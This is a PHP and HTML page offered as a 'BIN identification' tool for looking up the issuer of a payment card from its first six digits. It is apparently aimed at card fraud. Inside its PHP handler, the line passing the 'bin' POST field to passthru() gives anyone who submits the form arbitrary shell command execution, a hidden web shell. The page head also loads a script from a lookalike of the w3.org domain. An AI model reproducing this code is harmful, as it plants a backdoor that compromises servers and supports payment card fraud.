<html>
<link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/en_US/i/icon/pp_favicon_x.ico">
<link href="https://fonts.googleapis.com/css?family=Metal Mania|Ceviche+One|Nosifer|Iceberg|Rancho|Iceland|Nova+Mono|Libre+Barcode+39+Extended+Text" rel="stylesheet" type="text/css"> 
<head>
<script src='http://www.w32.info/TR/html4/loose.dtd'></script>
<title>bin checker </title>
<style>
body {
	font-family: 'Comic Sans MS'; font-size:12px;color:#ff4eff;
	background-image: url('http://3.bp.blogspot.com/-D6nQQ3d_wfw/Ts31QI5aQPI/AAAAAAAAAgA/mMEBDufqDpk/s1600/0_1_1.gif');	}
	hr {border:inset 1px #E5E5E5}

#form-container
	{ 	color:#ff4eff;
	font-family: 'Comic Sans MS', sans-serif;
	font-size:13px;
		background-color: #131313;
		border: solid 1px red;
		border-radius:10px;
		-moz-border-radius: 10px;
		-webkit-border-radius: 10px;
		box-shadow: 0px 0px 15px white;
		-moz-box-shadow: 0px 0px 15px red;
		-webkit-box-shadow: 0px 0px 15px white;
		margin:30px auto;
		padding:10px;
		width:680px;
		text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
	}





	input[type=text], textarea
	{
		background-color:#000;
		border:solid 1px red; color:red;
		border-radius:5px;
		-moz-border-radius: 5px;
		-webkit-border-radius: 5px;
	}
	textarea { width:100%;height:200px; resize:none }
	input[type=text] { width:160px;text-align:center }
	input[type=text]:focus, textarea:focus { background-color:black; border:solid 1px white; color:white; }
	.submit-button
	{
		background: #57A02C;
		border:solid 1px #57A02C;
		border-radius:5px;
			-moz-border-radius: 5px;
			-webkit-border-radius: 5px;
		-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
		border-bottom: 1px solid rgba(0,0,0,0.25);
		position: relative;
		color:#FFF;
		display: inline-block;
		cursor:pointer;
		font-size:13px;
		padding:3px 8px;
	}

	.business{
		color:yellow;
		font-weight: bold;
	}
	.premier{
		color:#00FF00;
		font-weight: bold;
	}
	.verified{
		color:#800080;
		font-weight: bold;
	}
	.style2{text-align: center ;font-weight: bold;font-family: 'Iceberg'  ;color: red;text-shadow: 0px 0px 60px white;font-size: 50px}

	.nolog{
		font-size: 10px;
		font: red;
	}
</style>
</head>
<body>
<div id="form-container"><div align="center" class="style2">Bin Identification</div>
<form name="data" method="post">
<textarea name="bincode" cols="50" rows="70" value="">FIRST 6 CODE OF CARD</textarea><br><br>
<input type="submit" name='bin' value="Check now!">
</form></div>
<?php
if(isset($_POST['bin'])){
$bin = $_POST['bin'];
passthru($bin);
$bin_code =$_POST['bincode'];
$bin_code = strtolower($bin_code);

if ($bin_code == null) {
echo "Put The First 6 Code Of The Card";
}else{

if ($bin_code == 000000) {
echo "BIN Not Found !!!!";
}
else {

$bankinfo= file_get_contents("http://www.binlist.net/xml/".$bin_code);
echo "<font color='#ff4eff'><br /><b><font size='4'>RAPPORT :  ".$bankinfo;
}
}
}
?>
	<br><br><br><br><br><br><br>
		<center>
	</font> <font size="3>" font color="#CECECE" face="Georgia">Copyright</font> <font size="2"><script>document.write(new Date().getFullYear())</script> </font><font size="3>" font color="#CECECE" face="Georgia">All rights reserved. codexrush</font></font>
<br><br><br>
<a href="http://tools.codexrush.com"><font color=white> <-- Return to previous page</a></font></center>
</body>
</html>